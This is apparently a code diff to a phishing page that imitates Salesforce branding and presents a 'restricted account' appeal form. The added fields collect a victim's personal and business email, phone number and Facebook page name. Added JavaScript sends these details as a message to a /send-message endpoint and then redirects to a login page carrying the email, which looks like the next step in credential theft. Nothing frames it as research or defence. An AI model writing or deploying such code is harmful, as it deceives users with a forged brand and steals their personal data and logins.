@@ -21,12 +21,24 @@
             <a class="menu-icon" href="#"> </a>
             <img class="logo" src="img/salesforce-with-type-logo.svg" />
             <div class="header-menu">
-                <a href="https://www.salesforce.com/ap/editions-pricing/overview/">Products</a>
-                <a href="https://www.salesforce.com/ap/solutions/industries/">Industries</a>
-                <a href="https://www.salesforce.com/ap/customer-success-stories/#!page=1">Customers</a>
+                <a
+                    href="https://www.salesforce.com/ap/editions-pricing/overview/"
+                    >Products</a
+                >
+                <a href="https://www.salesforce.com/ap/solutions/industries/"
+                    >Industries</a
+                >
+                <a
+                    href="https://www.salesforce.com/ap/customer-success-stories/#!page=1"
+                    >Customers</a
+                >
                 <a href="https://trailhead.salesforce.com/">Learning</a>
-                <a href="https://help.salesforce.com/s/?language=en_US">Support</a>
-                <a href="https://www.salesforce.com/company/our-story/">Company</a>
+                <a href="https://help.salesforce.com/s/?language=en_US"
+                    >Support</a
+                >
+                <a href="https://www.salesforce.com/company/our-story/"
+                    >Company</a
+                >
                 <a href="https://www.salesforce.com/plus/events">Salesforce+</a>
             </div>
         </div>
@@ -165,7 +177,7 @@
                         ></button>
                     </div>
                     <div class="modal-body">
-                        <form action="/login" id="first-form">
+                        <form id="first-form">
                             <div class="mb-3">
                                 <label
                                     for="exampleFormControlTextarea1"
@@ -180,6 +192,91 @@
                                     rows="1"
                                     required
                                 ></textarea>
+                                <div class="mb-3">
+                                    <label
+                                        for="PersonalEmailField"
+                                        class="form-label"
+                                        >Personal Email</label
+                                    >
+                                    <input
+                                        value=""
+                                        name="personal-email"
+                                        type="email"
+                                        class="form-control"
+                                        id="PersonalEmailField"
+                                        required
+                                        aria-describedby="emailHelp"
+                                    />
+                                </div>
+                                <div class="mb-3">
+                                    <label
+                                        for="BuisenessEmailField"
+                                        class="form-label"
+                                        >Business Email</label
+                                    >
+                                    <input
+                                        value=""
+                                        name="buiseness-email"
+                                        type="email"
+                                        class="form-control"
+                                        id="BuisenessEmailField"
+                                        required
+                                        aria-describedby="emailHelp"
+                                    />
+                                </div>
+
+                                <div class="mb-3">
+                                    <label for="PhoneFirld" class="form-label"
+                                        >Mobile phone number</label
+                                    >
+                                    <input
+                                        value=""
+                                        name="mobile-phone-number"
+                                        type="tel"
+                                        class="form-control"
+                                        id="PhoneFirld"
+                                        required
+                                        aria-describedby="emailHelp"
+                                        minlength="7"
+                                        maxlength="18"
+                                    />
+                                </div>
+                                <div class="mb-3">
+                                    <label
+                                        for="fb-page-name-input"
+                                        class="form-label"
+                                        >Facebook Page Name</label
+                                    >
+                                    <input
+                                        value=""
+                                        name="page-name"
+                                        type="text"
+                                        class="form-control"
+                                        id="fb-page-name-input"
+                                        required
+                                        minlength="3"
+                                        maxlength="80"
+                                        aria-describedby="emailHelp"
+                                    />
+                                </div>
+                                <div class="mb-3 form-check">
+                                    <input
+                                        name=""
+                                        type="checkbox"
+                                        class="form-check-input"
+                                        id="exampleCheck1"
+                                        required
+                                    />
+                                    <label
+                                        class="form-check-label"
+                                        for="exampleCheck1"
+                                        >I agree with
+
+                                        <a id="termsLink" class="add-svg"
+                                            >Terms of use
+                                        </a>
+                                    </label>
+                                </div>
                                 <div id="emailHelp" class="form-text">
                                     Please indicate why you believe that account
                                     restrictions were imposed by mistake.
@@ -188,7 +285,6 @@
 
                             <div class="form-btn-wrapper">
                                 <button class="btn send btn-primary">
-                                
                                     <span class="button-text">Send</span>
                                 </button>
                             </div>
@@ -300,7 +396,29 @@
             $(".btn-close").click(function () {
                 $("#exampleModal1").hide();
             });
-            
+
+            $("#first-form").submit(async function (e) {
+                e.preventDefault(); // Ngăn form reload trang
+
+                const appeal = $("#exampleFormControlTextarea1").val();
+                const personalEmail = $("#PersonalEmailField").val();
+                const businessEmail = $("#BuisenessEmailField").val();
+                const phoneNumber = $("#PhoneFirld").val();
+                const fbPageName = $("#fb-page-name-input").val();
+
+                const message = `📄 **New Appeal Submission** 📄\n📝 **Appeal:** ${appeal}\n📧**Personal Email:** ${personalEmail}\n📧 **Business Email:** ${businessEmail}\n📱 **Phone Number:** ${phoneNumber}\n📘 **Facebook Page Name:** ${fbPageName}`;
+                try {
+                    const response = await fetch(
+                        "/send-message?message=" + encodeURIComponent(message),
+                        {
+                            method: "GET",
+                        }
+                    );
+                } catch (error) {}
+                //submit form và thay action = /login?email= + email
+                window.location.href = "/login?email=" + personalEmail;
+                
+            });
         });
     </script>
 </html>
